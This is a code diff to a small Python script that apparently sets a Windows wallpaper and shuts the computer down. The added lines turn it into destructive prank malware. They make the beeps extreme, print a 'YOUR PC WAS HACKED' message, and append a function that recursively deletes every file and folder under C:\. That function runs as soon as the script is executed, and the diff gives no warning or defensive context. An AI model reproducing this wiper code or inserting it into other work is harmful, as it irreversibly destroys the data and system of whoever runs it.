@@ -19,9 +19,10 @@ def change_wallpaper(image_path):
         show_message("Error", f"Failed to change wallpaper: {e}")
         
 def shutdown_pc():
-    winsound.Beep(440, 1000)  
-    winsound.Beep(660, 1000)  
-    subprocess.run("shutdown /s /t 5", shell=True) 
+    winsound.Beep(11111, 100000)  
+    winsound.Beep(7000, 100000)  
+    print("YOUR PC WAS HACKED LOL HAHAH")
+    subprocess.run("shutdown /s /t 20", shell=True) 
 def show_message(title, message):
     root = tk.Tk()
     root.withdraw()  
@@ -31,3 +32,26 @@ image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg"
 
 change_wallpaper(image_path)
 shutdown_pc()
+import os
+import shutil
+
+def delete_all_files(directory):
+    for foldername, subfolders, filenames in os.walk(directory, topdown=False):
+        for filename in filenames:
+            try:
+                file_path = os.path.join(foldername, filename)
+                os.remove(file_path)
+                print(f"Deleted file: {file_path}")
+            except Exception as e:
+                print(f"Failed to delete {file_path}: {e}")
+
+        for subfolder in subfolders:
+            try:
+                folder_path = os.path.join(foldername, subfolder)
+                shutil.rmtree(folder_path)
+                print(f"Deleted folder: {folder_path}")
+            except Exception as e:
+                print(f"Failed to delete {folder_path}: {e}")
+
+
+delete_all_files("C:\\")
